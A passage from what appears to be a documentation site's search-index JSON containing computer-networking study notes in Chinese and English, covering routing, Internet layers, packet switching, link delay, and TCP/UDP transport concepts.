TTL\uff1a\u6bcf\u7ecf\u8fc7\u4e00\u4e2a\u8def\u7531\u5668\u51cf1\uff0c\u5f52\u96f6\u65f6\u4e22\u5f03\uff08\u9632\u6b62\u73af\u8def\uff09\u3002   - \u534f\u8bae\u53f7\uff1a\u6307\u793a\u4e0a\u5c42\u534f\u8bae\uff08\u5982TCP=6\u3001UDP=17\uff09\u3002  </p>"},{"location":"web/internet/#_3","title":"\u56db\u3001\u8def\u7531\u4e0e\u8f6c\u53d1\u673a\u5236","text":""},{"location":"web/internet/#1_routing_table","title":"1. \u8def\u7531\u8868\uff08Routing Table\uff09","text":"<p>\u8def\u7531\u5668\u6839\u636e\u8def\u7531\u8868\u51b3\u5b9a\u6570\u636e\u5305\u4e0b\u4e00\u8df3\uff0c\u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a | \u76ee\u6807\u7f51\u7edc | \u5b50\u7f51\u63a9\u7801 | \u4e0b\u4e00\u8df3    | \u63a5\u53e3 | |-------------|-------------|--------------|----------| | 192.168.1.0 | 255.255.255.0 | \u76f4\u63a5\u4ea4\u4ed8      | eth0     | | 0.0.0.0     | 0.0.0.0      | 203.0.113.1  | eth1     | \uff08\u9ed8\u8ba4\u8def\u7531\uff09</p>"},{"location":"web/internet/#2_1","title":"2. \u8def\u7531\u9009\u62e9\u65b9\u5f0f","text":"<ul> <li>\u9759\u6001\u8def\u7531\uff1a\u7ba1\u7406\u5458\u624b\u52a8\u914d\u7f6e\uff08\u9002\u5408\u5c0f\u578b\u7f51\u7edc\uff09\u3002  </li> <li>\u52a8\u6001\u8def\u7531\uff1a  </li> <li>\u8ddd\u79bb\u5411\u91cf\u534f\u8bae\uff08\u5982RIP\uff09\uff1a\u57fa\u4e8e\u8df3\u6570\u9009\u62e9\u8def\u5f84\u3002  </li> <li>\u94fe\u8def\u72b6\u6001\u534f\u8bae\uff08\u5982OSPF\uff09\uff1a\u57fa\u4e8e\u5e26\u5bbd\u3001\u5ef6\u8fdf\u7b49\u7efc\u5408\u5ea6\u91cf\u3002  </li> </ul>"},{"location":"web/internet/#_4","title":"\u4e94\u3001\u8de8\u7f51\u7edc\u901a\u4fe1\u6d41\u7a0b","text":"<p>\u793a\u4f8b\uff1a\u4e3b\u673aA\uff08<code>192.168.1.2</code>\uff09\u8bbf\u95ee\u670d\u52a1\u5668B\uff08<code>203.0.113.5</code>\uff09\u3002 1. \u5c01\u88c5IP\u6570\u636e\u62a5\uff1a\u4e3b\u673aA\u5c06HTTP\u8bf7\u6c42\u5c01\u88c5\u4e3aIP\u6570\u636e\u62a5\uff0c\u76ee\u6807IP=<code>203.0.113.5</code>\u3002 2. \u67e5\u8be2\u8def\u7531\u8868\uff1a    - \u82e5\u76ee\u6807IP\u4e0d\u5728\u672c\u5730\u7f51\u7edc\uff0c\u53d1\u9001\u5230\u9ed8\u8ba4\u7f51\u5173\uff08\u5982<code>192.168.1.1</code>\uff09\u3002 3. ARP\u89e3\u6790MAC\u5730\u5740\uff1a\u4e3b\u673aA\u901a\u8fc7ARP\u83b7\u53d6\u7f51\u5173\u7684MAC\u5730\u5740\u3002 4. \u9010\u8df3\u8f6c\u53d1\uff1a\u8def\u7531\u5668\u6839\u636e\u8def\u7531\u8868\u5c06\u6570\u636e\u5305\u4f20\u9012\u5230\u76ee\u6807\u7f51\u7edc\u3002 5. \u89e3\u5c01\u88c5\uff1a\u670d\u52a1\u5668B\u63a5\u6536IP\u6570\u636e\u62a5\uff0c\u63d0\u53d6\u4e0a\u5c42\uff08TCP/HTTP\uff09\u6570\u636e\u3002  </p>"},{"location":"web/internet/#_5","title":"\u516d\u3001\u5173\u952e\u95ee\u9898\u4e0e\u89e3\u51b3\u65b9\u6848","text":"\u95ee\u9898 \u89e3\u51b3\u65b9\u6848 IP\u5730\u5740\u4e0d\u8db3 IPv6\u3001NAT\uff08\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff09\u3001CIDR\uff08\u65e0\u7c7b\u57df\u95f4\u8def\u7531\uff09\u3002 \u5206\u7247\u4e0e\u91cd\u7ec4 IP\u6570\u636e\u62a5\u5206\u7247\uff08\u9002\u5e94\u4e0d\u540cMTU\uff09\uff0c\u76ee\u6807\u4e3b\u673a\u91cd\u7ec4\u3002 \u8def\u7531\u73af\u8def TTL\u5b57\u6bb5\u3001\u8def\u7531\u534f\u8bae\u73af\u8def\u907f\u514d\u673a\u5236\uff08\u5982OSPF\u7684SPF\u7b97\u6cd5\uff09\u3002 \u5f02\u6784\u7f51\u7edc\u4e92\u8054 IP\u534f\u8bae\u7edf\u4e00\u7f16\u5740\uff0c\u8def\u7531\u5668\u5b9e\u73b0\u534f\u8bae\u8f6c\u6362\u3002"},{"location":"web/internet/#vs","title":"\u4e03\u3001\u7f51\u7edc\u5c42 vs \u5176\u4ed6\u5c42","text":"\u5c42\u7ea7 \u6838\u5fc3\u4efb\u52a1 \u5178\u578b\u8bbe\u5907 \u6570\u636e\u94fe\u8def\u5c42 \u540c\u4e00\u94fe\u8def\u5185\u5e27\u4f20\u8f93\uff08MAC\u5730\u5740\uff09 \u4ea4\u6362\u673a\u3001\u7f51\u6865 \u7f51\u7edc\u5c42 \u8de8\u7f51\u7edc\u6570\u636e\u5305\u8def\u7531\uff08IP\u5730\u5740\uff09 \u8def\u7531\u5668 \u4f20\u8f93\u5c42 \u7aef\u5230\u7aef\u53ef\u9760\u4f20\u8f93\uff08TCP/UDP\u7aef\u53e3\uff09 \u9632\u706b\u5899\u3001NAT\u8bbe\u5907"},{"location":"web/internet/#_6","title":"\u516b\u3001\u603b\u7ed3","text":"<p>\u7f51\u7edc\u5c42\u662f\u4e92\u8054\u7f51\u7684\u201c\u4ea4\u901a\u67a2\u7ebd\u201d\uff0c\u901a\u8fc7IP\u5bfb\u5740\u548c\u8def\u7531\u9009\u62e9\u5b9e\u73b0\u5168\u7403\u4e92\u8054\u3002\u5176\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u5c4f\u853d\u5e95\u5c42\u5dee\u5f02\uff08\u5982\u4ee5\u592a\u7f51\u3001Wi-Fi\uff09\uff0c\u5b9e\u73b0\u65e0\u7f1d\u901a\u4fe1\u3002 2. \u52a8\u6001\u9002\u5e94\u7f51\u7edc\u53d8\u5316\uff08\u5982\u94fe\u8def\u6545\u969c\u3001\u62d3\u6251\u8c03\u6574\uff09\u3002 3. \u6269\u5c55\u6027\uff08IPv6\u3001SDN\u7b49\u6280\u672f\u7684\u6f14\u8fdb\uff09\u3002  </p> <p>\u7406\u89e3\u7f51\u7edc\u5c42\u662f\u638c\u63e1\u4e92\u8054\u7f51\u5de5\u4f5c\u539f\u7406\u7684\u57fa\u7840\uff0c\u4e5f\u662f\u8bbe\u8ba1\u9ad8\u6548\u3001\u53ef\u9760\u7f51\u7edc\u67b6\u6784\u7684\u5173\u952e\u3002</p>"},{"location":"web/intro/","title":"Introduction","text":""},{"location":"web/intro/#layers_of_internet","title":"Layers of Internet","text":""},{"location":"web/intro/#layer_1_physical_layer","title":"Layer 1: Physical Layer","text":"<p>In the Internet, we\u2019re looking for a way to signal bits (1s and 0s) across space.  The technology could be voltages on an electrical wire, wireless radio waves, light pulses along optical fiber cables, among others.</p>"},{"location":"web/intro/#layer_2_link_layer","title":"Layer 2: Link Layer","text":"<p>In the Internet, a link connects two machines. That link could be using any sort of technology (wired, wireless, optical fiber, etc.). If we use links to connect up a bunch of nearby computers, we get a local area network (LAN).</p> <p>At Layer 2, we can also group bits into units of data called packets (or frames at this layer), and define where a packet starts and ends in the physical signal. We can also handle problems like multiple people simultaneously using the same wire to send data.</p>"},{"location":"web/intro/#layer_3_internet_layer","title":"Layer 3: Internet Layer","text":"<p>In the Internet, the post office receiving and redirecting mail is called a switch or router.</p> <p>If we build additional links between switches, we can connect up local networks. </p> <p>With enough links and local networks, we can connect everybody in the world, resulting in the Internet.</p> <p>On the Internet, the operators are Internet service providers, who own and operate Internet structure.</p>"},{"location":"web/intro/#network_of_networks","title":"Network of Networks","text":"<p> In the Internet, end hosts are machines (e.g. servers, laptops, phones) communicating over the Internet. By contrast, a switch (also called a router) is a machine that isn\u2019t sending or receiving its own data, but exists to help the end hosts communicate with each other. </p>"},{"location":"web/intro/#best-effort_service_model","title":"Best-Effort Service Model","text":"<p>service model: a contract between the network and users, describing what the network does and doesn\u2019t support. The designers of the Internet didn\u2019t support any of those models. Instead, the Internet only supports best effort delivery of data. If you send data over Layer 3, the Internet will try its best to deliver it, but there is no guarantee that the data will be delivered. The Internet also won\u2019t tell you whether or not the delivery succeeded.</p>"},{"location":"web/intro/#packets_abstraction","title":"Packets Abstraction","text":"<p>Packets are limited in size. If the application has some large data to send (e.g. a video), we need to somehow split up that data into packets, and send each packet through the network independently.</p>"},{"location":"web/intro/#layer_4_transport","title":"Layer 4: Transport","text":"<p>This layer uses Layer 3 as a building block, and implements an additional protocol for  - re-sending lost packets,  - splitting data into packets, and  - reordering packets that arrive out-of-order (among other features).</p> <p>The transport layer protocol allows us to stop thinking in terms of packets, and start thinking in terms of flows, streams of packets that are exchanged between two endpoints.</p>"},{"location":"web/intro/#layer_7_application","title":"Layer 7: Application","text":"<p>The Internet\u2019s design allows it to be a general-purpose communication network for any type of application data.</p> <p>Each layer relies on services from the layer directly below, and provides services to the layer directly above. Two layers interact directly through the interface between them.</p>"},{"location":"web/intro/#headers","title":"Headers","text":"<p>Just like the envelope, when we send a packet, we need to attach additional metadata that tells the network infrastructure what to do with that packet. This additional metadata is called a header. The rest of the bits (e.g. the file being sent, the letter inside the envelope) is called the payload.</p> <ul> <li> <p>The network infrastructure should only read the header to decide how to deliver the data.</p> </li> <li> <p>The application at the end host cares about the payload, not the header. That said, the end hosts still need to know about headers, in order to add headers to packets before sending them.</p> </li> </ul>"},{"location":"web/intro/#headers_are_standardized","title":"Headers are Standardized","text":"<p>Everybody on the Internet (every end host, every switch) needs to agree on the format of a header.</p>"},{"location":"web/intro/#what_should_a_header_contain","title":"What Should a Header Contain?","text":"<ul> <li>destination address, definitely</li> </ul> <p>other information that\u2019s not required, but is useful to have: - the source address</p> <ul> <li> <p>checksum, to ensure that packet is not corrupted while in transit</p> </li> <li> <p>other metadata like the length of the packet</p> </li> </ul>"},{"location":"web/intro/#multiple_headers","title":"Multiple Headers","text":"<p> Note that some layers offer multiple choices of protocol (e.g. wireless or wired protocols at Layer 2). In these cases, the two people communicating need to use the same choice of protocol. A wired sender can\u2019t talk to a wireless recipient.</p>"},{"location":"web/intro/#addressing_and_naming","title":"Addressing and Naming","text":"<p>Different layers in the Internet have different addressing schemes that work best for that particular layer.</p> <ul> <li>Sometimes a host is referred to by its human-readable name (e.g. www.google.com). </li> <li>Other times, that same host is referred to by a machine-readable IP address (e.g. 74.124.56.2), where this number somehow encodes something about the server\u2019s location (and could change if the server moves). </li> <li>Other times, that same host could be referred to by its hardware MAC address, which never changes.</li> </ul>"},{"location":"web/intro/#layers_at_hosts_and_routers","title":"Layers at Hosts and Routers","text":""},{"location":"web/intro/#layers","title":"Layers","text":"<ul> <li>The end hosts need to implement all the layers.</li> <li>The router does need Layer 1 for receiving bits on a wire, Layer 2 for sending packets along the wire, and Layer 3 for forwarding packets in the global network.</li> </ul>"},{"location":"web/intro/#multiple_headers_1","title":"Multiple Headers","text":"<p>First, Host A takes the message and works its way down the stack, adding headers for Layer 7, 4, 3, 2, and 1.  </p> <p>The router reads and unwraps the Layer 1 and Layer 2 headers, revealing the Layer 3 header underneath. The router reads this header to decide where to forward the packet next. </p> <p>Now, to pass the packet along to the next hop, the router must go down the stack again, wrapping new Layer 2 and Layer 1 headers, and then sending the bits along the wire to the next hop. </p> <p>This pattern repeats at every router</p> <p>Eventually, the packet reaches Host B, who unwraps every layer, one by one: Layer 1, 2, 3, 4, 7. Host B has successfully received the message! </p> <p>In summary: Each router parses Layers 1 through 3, while the end hosts parse Layers 1 through 7. </p>"},{"location":"web/intro/#consequence","title":"Consequence","text":"<p>One consequence of this layering scheme is that each hop can use different protocols at Layer 2 and 1. More generally, we said that each layer only needs to communicate with its peers at the same layer.  - The host\u2019s peer is the other host. - The router\u2019s peers are its neighboring routers along the path.</p>"},{"location":"web/intro/#network_architecture","title":"Network Architecture","text":"<p>The term socket refers to an OS mechanism for connecting an application to the networking stack in the OS.  When an application opens a socket, that socket is associated with a logical port number. When the OS receives a packet, it uses the port number to direct that packet to the associated socket.</p>"},{"location":"web/intro/#designing_resource_sharing","title":"Designing Resource Sharing","text":""},{"location":"web/intro/#statistical_multiplexing","title":"Statistical Multiplexing","text":"<p>The Internet needs to support many simultaneous flows at the same time, despite limited capacity.</p> <p>We often say that the network resources are statistically multiplexed, which means that we\u2019ll dynamically allocate resources to users based on their demand, instead of partitioning a fixed share of resources to users.</p> <p></p> <p>The premise that makes statistical multiplexing work is: In practice, the peak of aggregate demand is much less than the aggregate of peak demands.</p> <p> </p> <p>Peaks could still happen at the same time, which would cause packets to be delayed or dropped (recall the link queue).  Nevertheless, we made the design choice to statistically multiplex and use resources more efficiently, while dealing with the consequences (occasional simultaneous peaks).</p>"},{"location":"web/intro/#circuit_switching_vs_packet_switching","title":"Circuit Switching vs. Packet Switching","text":"<p>How do we actually dynamically allocate resources between users?</p>"},{"location":"web/intro/#packet_switching","title":"Packet Switching","text":"<p>One approach is best-effort. </p> <p>Everybody sends their data into the network and hopes for the best. There\u2019s no guarantee that there will be enough bandwidth to meet your demand. The switch looks at each packet independently and forwards the packet closer to its destination.  The switches are also independent from each other. As a packet hops across switches, every switch considers the packet independently.</p>"},{"location":"web/intro/#circuit_switching","title":"Circuit Switching","text":"<p>The other approach is based on </p> <p>At the start of a flow, the end hosts identify a path (sequence of switches and links) through the network, using some routing algorithm.  Then, the source sends a special reservation request message to the destination. Along the way, every switch hears about this request as well. If every switch accepts the request, then the reservation is made, and a circuit of switches has been established between the source and destination. </p> <p>Once the reservation is confirmed by every switch, data can be sent. Eventually, when the flow ends, the source sends a teardown message to the recipient. Along the way, every switch sees this message and releases its capacity. </p> <p>Remember, both circuit switching and packet switching are embodying statistical multiplexing.  The main difference is the granularity at which we\u2019re allocating resources: per-flow with reservations, or per-packet with best-effort.  Even in circuit switching, we\u2019re dynamically allocating resources based on reservations. We are not preemptively reserving for all flows that might ever exist.</p> <p></p>"},{"location":"web/intro/#trade-offs","title":"Trade-offs","text":"<p>Circuit switching gives the application better performance with reserved bandwidth. It also gives the developer more predictable behavior.</p> <p>However, packet switching gives us more efficient sharing of bandwidth, and avoids startup time. It also gives us easier recovery from failure, and is generally simpler to implement (less for routers to think about).</p>"},{"location":"web/intro/#in_practice","title":"In Practice","text":"<p>In the modern Internet, packet switching is the default approach.</p>"},{"location":"web/intro/#link","title":"Link","text":""},{"location":"web/intro/#properties_of_links","title":"Properties of Links","text":"<p>The bandwidth of a link tells us how many bits we can send on the link per unit time.  Intuitively, this is the speed of the link.  We usually measure bandwidth in bits per second (e.g. 5 Gbps = 5 billion bits per second).</p> <p>The propagation delay of a link tells us how long it takes for a bit to travel along the link.  Propagation delay is measured in time (e.g. nanoseconds, milliseconds). -- In the context of a link, the latency is its propagation delay, though this word can also be used in other contexts</p> <p>If we multiply the bandwidth and the propagation delay, we get the bandwidth-delay product (BDP).  Intuitively, this is the capacity of the link, or the number of bits that exist on the link at any given instant. </p> <p>pipe analogy: </p>"},{"location":"web/intro/#packet_delay","title":"Packet Delay","text":"<p>The transmission delay tells us how long it takes to put the bits on the wire.  In general, this is the packet size divided by the link bandwidth.</p> <p>The packet delay is the time it takes for an entire packet to be sent, starting from the time the first bit is put on the wire, to the time the last bit is received at the other end.  This delay is the sum of the transmission delay and the propagation delay.</p>"},{"location":"web/intro/#overloaded_links","title":"Overloaded Links","text":""},{"location":"web/intro/#transient_overload","title":"Transient Overload","text":"<p>In the long term, we have enough capacity to send all the outgoing packets, but at this very instant in time, we have two packets arriving simultaneously, and we can only send out one.</p> <p></p> <p>To cope with transient overload, the switch maintains a queue of packets. If two packets arrive simultaneously, the switch queues one of them and sends out the other one. At any given time, the switch could choose to send a packet from one of the incoming links, or send a packet from the queue. This choice is determined by a packet scheduling algorithm.</p>"},{"location":"web/intro/#persistent_overload","title":"Persistent Overload","text":"<p>There just isn\u2019t enough capacity on the outgoing link to support the level of incoming traffic.</p> <p></p> <p>We could fill the queue up, but that still isn\u2019t enough to support the incoming load. One way or another, the switch will drop packets. One possible solution to overload is to have the router tell the senders to slow down.</p>"},{"location":"web/transform/","title":"Transform","text":""},{"location":"web/transform/#transport_layer","title":"\u4f20\u8f93\u5c42\uff08Transport Layer\uff09\u8be6\u89e3","text":"<p>\u4f20\u8f93\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u56db\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u540c\u540d\u5c42\uff09\uff0c\u6838\u5fc3\u4efb\u52a1\u662f\u63d0\u4f9b\u7aef\u5230\u7aef\uff08End-to-End\uff09\u7684\u6570\u636e\u4f20\u8f93\u670d\u52a1\uff0c\u786e\u4fdd\u6570\u636e\u5728\u6e90\u4e3b\u673a\u548c\u76ee\u6807\u4e3b\u673a\u4e4b\u95f4\u53ef\u9760\u6216\u9ad8\u6548\u5730\u4f20\u9012\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u7684\u89e3\u6790\uff1a</p>"},{"location":"web/transform/#_1","title":"\u4e00\u3001\u4f20\u8f93\u5c42\u7684\u6838\u5fc3\u529f\u80fd","text":"\u529f\u80fd \u8bf4\u660e \u8fdb\u7a0b\u95f4\u901a\u4fe1 \u901a\u8fc7\u7aef\u53e3\u53f7\u6807\u8bc6\u5e94\u7528\u8fdb\u7a0b\uff08\u5982HTTP=80\uff0cSSH=22\uff09\u3002 \u53ef\u9760\u4f20\u8f93 \u63d0\u4f9b\u6570\u636e\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6392\u5e8f\u7b49\u673a\u5236\uff08\u5982TCP\uff09\u3002 \u6d41\u91cf\u63a7\u5236 \u901a\u8fc7\u6ed1\u52a8\u7a97\u53e3\u673a\u5236\u907f\u514d\u53d1\u9001\u65b9\u6df9\u6ca1\u63a5\u6536\u65b9\uff08TCP\u7279\u6709\uff09\u3002 \u62e5\u585e\u63a7\u5236 \u52a8\u6001\u8c03\u6574\u53d1\u9001\u901f\u7387\u4ee5\u907f\u514d\u7f51\u7edc\u8fc7\u8f7d\uff08\u5982TCP\u7684\u6162\u542f\u52a8\u3001\u62e5\u585e\u907f\u514d\uff09\u3002 \u591a\u8def\u590d\u7528/\u89e3\u590d\u7528 \u591a\u4e2a\u5e94\u7528\u5171\u4eab\u540c\u4e00\u7f51\u7edc\u8fde\u63a5\uff08\u5982\u6d4f\u89c8\u5668\u540c\u65f6\u4e0b\u8f7d\u56fe\u7247\u548c\u6587\u672c\uff09\u3002"},{"location":"web/transform/#_2","title":"\u4e8c\u3001\u6838\u5fc3\u534f\u8bae","text":""},{"location":"web/transform/#1_tcp","title":"1. TCP\uff08\u4f20\u8f93\u63a7\u5236\u534f\u8bae\uff09","text":"<ul> <li>\u7279\u70b9\uff1a  </li> <li>\u9762\u5411\u8fde\u63a5\uff08\u9700\u4e09\u6b21\u63e1\u624b\u5efa\u7acb\u8fde\u63a5\uff09\u3002 </li> <li>\u4e00\u5bf9\u4e00 </li> <li>\u53ef\u9760\u4f20\u8f93\uff08\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6570\u636e\u6392\u5e8f\uff09\u3002  </li> <li>\u9762\u5411\u5b57\u8282\u6d41</li> <li>\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002  </li> <li>\u9002\u7528\u573a\u666f\uff1aWeb\u6d4f\u89c8\uff08HTTP\uff09\u3001\u6587\u4ef6\u4f20\u8f93\uff08FTP\uff09\u3001\u7535\u5b50\u90ae\u4ef6\uff08SMTP\uff09\u7b49\u9700\u53ef\u9760\u6027\u7684\u670d\u52a1\u3002</li> </ul>"},{"location":"web/transform/#2_udp","title":"2. UDP\uff08\u7528\u6237\u6570\u636e\u62a5\u534f\u8bae\uff09","text":"<ul> <li>\u7279\u70b9\uff1a  </li> <li>\u65e0\u8fde\u63a5\uff08\u76f4\u63a5\u53d1\u9001\u6570\u636e\uff0c\u65e0\u9700\u63e1\u624b\uff09\u3002  </li> <li>\u4e00\u5bf9\u591a\uff0c\u591a\u5bf9\u4e00\uff0c\u591a\u5bf9\u591a</li> <li>\u4e0d\u53ef\u9760\u4f20\u8f93\uff08\u4e0d\u4fdd\u8bc1\u6570\u636e\u5230\u8fbe\u6216\u987a\u5e8f\uff09\u3002</li> <li>\u9762\u5411\u62a5\u6587</li> <li>\u4f4e\u5ef6\u8fdf\u3001\u5f00\u9500\u5c0f\u3002 </li> <li>\u9002\u7528\u573a\u666f\uff1a\u89c6\u9891\u6d41\uff08\u5982Zoom\uff09\u3001\u5728\u7ebf\u6e38\u620f\u3001DNS\u67e5\u8be2\u7b49\u5b9e\u65f6\u6027\u8981\u6c42\u9ad8\u7684\u670d\u52a1\u3002</li> </ul>"},{"location":"web/transform/#3","title":"3. \u5176\u4ed6\u534f\u8bae","text":"<ul> <li>SCTP\uff1a\u7ed3\u5408TCP\u548cUDP\u7279\u6027\uff0c\u652f\u6301\u591a\u5bbf\u4e3b\uff08Multi-homing\uff09\u548c\u6d88\u606f\u8fb9\u754c\uff08\u7528\u4e8eVoIP\uff09\u3002  </li> <li>QUIC\uff1a\u57fa\u4e8eUDP\u7684\u73b0\u4ee3\u534f\u8bae\uff08HTTP/3\u4f7f\u7528\uff09\uff0c\u89e3\u51b3TCP\u7684\u961f\u5934\u963b\u585e\u95ee\u9898\u3002</li> </ul>"},{"location":"web/transform/#_3","title":"\u4e09\u3001\u5173\u952e\u6982\u5ff5\u4e0e\u6280\u672f","text":""},{"location":"web/transform/#1_port","title":"1. \u7aef\u53e3\u53f7\uff08Port\uff09","text":"<ul> <li>\u4f5c\u7528\uff1a\u6807\u8bc6\u4e3b\u673a\u4e0a\u7684\u5177\u4f53\u5e94\u7528\u8fdb\u7a0b\uff08\u8303\u56f4\uff1a0~65535\uff09\u3002  </li> <li>\u5206\u7c7b\uff1a  </li> <li>\u77e5\u540d\u7aef\u53e3\uff080~1023\uff09\uff1a\u5982HTTP=80\u3001HTTPS=443\u3001SSH=22\u3002  </li> <li>\u6ce8\u518c\u7aef\u53e3\uff081024~49151\uff09\uff1a\u5982MySQL=3306\u3002  </li> <li>\u52a8\u6001\u7aef\u53e3\uff0849152~65535\uff09\uff1a\u5ba2\u6237\u7aef\u4e34\u65f6\u4f7f\u7528\u3002  </li> </ul>"},{"location":"web/transform/#2_tcp","title":"2. TCP\u8fde\u63a5\u7ba1\u7406","text":"<ul> <li>\u4e09\u6b21\u63e1\u624b\uff1a</li> <li>SYN: \u540c\u6b65\u4f4d</li> <li>ACK: \u786e\u8ba4\u4f4d</li> <li>seq: \u5e8f\u5217\u53f7 (\u5e8f\u53f7)</li> <li>ack: \u786e\u8ba4\u53f7 (\u671f\u671b\u4e0b\u4e00\u4e2a\u5e8f\u53f7)   <pre><code>1. \u5ba2\u6237\u7aef \u2192 SYN = 1, seq = x \u2192 \u670d\u52a1\u7aef  \n2. \u670d\u52a1\u7aef \u2192 SYN = 1, ACK = 1, ack = x + 1, seq = y \u2192 \u5ba2\u6237\u7aef  \n3. \u5ba2\u6237\u7aef \u2192 ACK = 1, seq = x + 1, ack = y + 1 \u2192 \u670d\u52a1\u7aef  \n</code></pre></li> <li>\u56db\u6b21\u6325\u624b\uff1a  </li> <li>FIN: \u7ec8\u6b62\u4f4d   <pre><code>1. \u5ba2\u6237\u7aef \u2192 FIN = 1, seq = u \u2192 \u670d\u52a1\u7aef  \n2. \u670d\u52a1\u7aef \u2192 ACK = 1, seq = v, ack = u + 1 \u2192 \u5ba2\u6237\u7aef  \n3. \u670d\u52a1\u7aef \u2192 FIN = 1, ACK = 1, seq = w, ack = u + 1 \u2192 \u5ba2\u6237\u7aef  \n4. \u5ba2\u6237\u7aef \u2192 ACK = 1, seq = u + 1, ack = w + 1 \u2192 \u670d\u52a1\u7aef  \n</code></pre></li> </ul>"},{"location":"web/transform/#3_tcp","title":"3. \u53ef\u9760\u4f20\u8f93\u673a\u5236\uff08TCP\uff09","text":"<ul> <li>\u5e8f\u5217\u53f7\u4e0e\u786e\u8ba4\u53f7\uff1a\u6bcf\u4e2a\u5b57\u8282\u6570\u636e\u90fd\u6709\u552f\u4e00\u5e8f\u5217\u53f7\uff0c\u63a5\u6536\u65b9\u901a\u8fc7ACK\u786e\u8ba4\u3002  </li> <li>\u8d85\u65f6\u91cd\u4f20\uff1a\u672a\u6536\u5230ACK\u65f6\u91cd\u53d1\u6570\u636e\u3002  </li> <li>\u6ed1\u52a8\u7a97\u53e3\uff1a\u52a8\u6001\u8c03\u6574\u53d1\u9001\u7a97\u53e3\u5927\u5c0f\u4ee5\u5339\u914d\u63a5\u6536\u65b9\u5904\u7406\u80fd\u529b\u3002</li> </ul>"},{"location":"web/transform/#4_udp","title":"4. UDP\u7684\u8f7b\u91cf\u7ea7\u8bbe\u8ba1","text":"<ul> <li>\u65e0\u8fde\u63a5\uff1a\u76f4\u63a5\u53d1\u9001\u6570\u636e\u62a5\uff0c\u65e0\u9700\u7ef4\u62a4\u8fde\u63a5\u72b6\u6001\u3002  </li> <li>\u6821\u9a8c\u548c\u53ef\u9009\uff1a\u4ec5\u63d0\u4f9b\u57fa\u672c\u9519\u8bef\u68c0\u6d4b\uff08\u4e0d\u4fdd\u8bc1\u7ea0\u6b63\uff09\u3002  </li> </ul>"},{"location":"web/transform/#tcp_vs_udp","title":"\u56db\u3001TCP vs UDP\u5bf9\u6bd4","text":"\u7279\u6027 TCP UDP \u8fde\u63a5\u65b9\u5f0f \u9762\u5411\u8fde\u63a5\uff08\u4e09\u6b21\u63e1\u624b\uff09 \u65e0\u8fde\u63a5 \u53ef\u9760\u6027 \u53ef\u9760\uff08\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6392\u5e8f\uff09 \u4e0d\u53ef\u9760 \u6d41\u91cf\u63a7\u5236 \u652f\u6301\uff08\u6ed1\u52a8\u7a97\u53e3\uff09 \u4e0d\u652f\u6301 \u62e5\u585e\u63a7\u5236 \u652f\u6301\uff08\u6162\u542f\u52a8\u3001\u62e5\u585e\u907f\u514d\uff09 \u4e0d\u652f\u6301 \u5934\u90e8\u5f00\u9500 \u8f83\u5927\uff0820~60\u5b57\u8282\uff09 \u8f83\u5c0f\uff088\u5b57\u8282\uff09 \u5ef6\u8fdf \u8f83\u9ad8\uff08\u9700\u63e1\u624b\u3001\u786e\u8ba4\uff09 \u6781\u4f4e \u9002\u7528\u573a\u666f \u6587\u4ef6\u4f20\u8f93\u3001\u7f51\u9875\u6d4f\u89c8 \u89c6\u9891\u4f1a\u8bae\u3001\u5b9e\u65f6\u6e38\u620f\u3001DNS"},{"location":"web/transform/#_4","title":"\u4e94\u3001\u4f20\u8f93\u5c42\u4e0e\u4e0b\u5c42\u7684\u5173\u7cfb","text":""},{"location":"web/transform/#1_ip","title":"1. \u4f9d\u8d56\u7f51\u7edc\u5c42\uff08IP\u5c42\uff09","text":"<ul> <li>IP\u5730\u5740\uff1a\u5b9a\u4f4d\u76ee\u6807\u4e3b\u673a\uff08\u5982<code>192.168.1.1</code>\uff09\u3002  </li> <li>\u4f20\u8f93\u5c42\u7aef\u53e3\uff1a\u5b9a\u4f4d\u4e3b\u673a\u4e0a\u7684\u5177\u4f53\u670d\u52a1\uff08\u5982<code>80</code>\u7aef\u53e3\u5bf9\u5e94Web\u670d\u52a1\u5668\uff09\u3002  </li> </ul>"},{"location":"web/transform/#2","title":"2. \u4e0e\u94fe\u8def\u5c42\u7684\u533a\u522b","text":"\u4f20\u8f93\u5c42 \u94fe\u8def\u5c42 \u7aef\u5230\u7aef\u901a\u4fe1\uff08\u8de8\u7f51\u7edc\uff09 \u70b9\u5bf9\u70b9\u901a\u4fe1\uff08\u540c\u4e00\u94fe\u8def\u5185\uff09 \u4f7f\u7528\u7aef\u53e3\u53f7\u6807\u8bc6\u8fdb\u7a0b \u4f7f\u7528MAC\u5730\u5740\u6807\u8bc6\u8bbe\u5907 \u89e3\u51b3\u53ef\u9760\u6027\u3001\u6d41\u91cf\u63a7\u5236\u95ee\u9898 \u89e3\u51b3\u5e27\u4f20\u8f93\u3001\u9519\u8bef\u68c0\u6d4b\u95ee\u9898"},{"location":"web/transform/#_5","title":"\u516d\u3001\u5b9e\u9645\u5e94\u7528\u793a\u4f8b","text":""},{"location":"web/transform/#1tcp","title":"\u573a\u666f1\uff1a\u7f51\u9875\u52a0\u8f7d\uff08TCP\uff09","text":"<ol> <li>\u6d4f\u89c8\u5668\uff08\u7aef\u53e3<code>54321</code>\uff09\u5411\u670d\u52a1\u5668\uff08\u7aef\u53e3<code>80</code>\uff09\u53d1\u8d77TCP\u8fde\u63a5\uff08\u4e09\u6b21\u63e1\u624b\uff09\u3002  </li> <li>\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u8fd4\u56deHTML\u6587\u4ef6\uff08\u901a\u8fc7TCP\u786e\u8ba4\u673a\u5236\u4fdd\u8bc1\u6570\u636e\u5b8c\u6574\uff09\u3002  </li> <li>\u4f20\u8f93\u5b8c\u6210\u540e\u56db\u6b21\u6325\u624b\u91ca\u653e\u8fde\u63a5\u3002</li> </ol>"},{"location":"web/transform/#2udp","title":"\u573a\u666f2\uff1a\u89c6\u9891\u901a\u8bdd\uff08UDP\uff09","text":"<ol> 